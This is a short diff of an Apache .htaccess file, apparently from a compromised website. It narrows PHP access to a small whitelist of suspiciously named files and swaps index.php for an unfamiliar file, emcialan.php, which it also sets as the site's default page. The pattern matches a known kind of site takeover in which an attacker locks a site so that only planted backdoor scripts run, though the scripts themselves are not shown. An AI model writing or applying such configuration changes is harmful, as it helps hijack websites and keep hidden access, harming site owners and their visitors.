@@ -5,9 +5,9 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(index.php|about.php|load.php|extension.php|wp-signin.php|protect-uploads-file.php)$">
+<FilesMatch "^(emcialan.php|about.php|load.php|extension.php|wp-signin.php|protect-uploads-file.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
 
-DirectoryIndex index.php
+DirectoryIndex emcialan.php
